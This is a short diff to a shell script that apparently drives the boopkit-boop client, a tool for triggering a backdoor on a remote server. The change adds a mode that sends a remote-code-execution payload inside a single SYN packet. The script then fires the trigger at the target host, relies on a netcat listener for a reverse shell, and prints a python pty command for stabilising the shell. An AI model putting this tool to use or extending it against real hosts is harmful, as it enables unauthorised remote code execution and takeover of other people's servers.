@@ -36,6 +36,12 @@ RPORT=${RPORT:-"22"}
 LHOST=${LHOST:-"127.0.0.1"}
 LPORT=${LPORT:-"3535"}
 
+# SINGLE_SYN will run the boopkit-boop client
+# in payload only mode. This means we will
+# try to attach our RCE as a payload in a single
+# SYN packet!
+SINGLE_SYN=1
+
 # [Reverse shell]
 #
 # Use netcat to listen locally for a shell.
@@ -59,19 +65,19 @@ trigger(){
       -lport $LPORT \
       -rhost $RHOST \
       -rport $RPORT \
-      -c "$RCE" -p
+      -c "$RCE" ${P}
 }
 
 # Check for permissions to host a local socket.
-if [ "$EUID" -ne 0 ]
-  then echo "Permission denied."
+if [ "$EUID" -ne 0 ]; then
+  echo "Permission denied."
   exit
 fi
 
-echo "LHOST : ${LHOST}"
-echo "LPORT : ${LPORT}"
-echo "RHOST : ${RHOST}"
-echo "RPORT : ${RPORT}"
+P=""
+if [ "$SINGLE_SYN" -ne 0 ]; then
+  P="-p"
+fi
 
 # Right away trigger the backdoor on the server
 trigger &
@@ -80,6 +86,8 @@ trigger &
 #
 # Note: this is only required if you are performing
 # a reverse shell!
+#
+# Remind the user of how to use shell stabilization
 echo ""
 echo "python -c \"import pty; pty.spawn('/bin/bash')\""
 echo ""
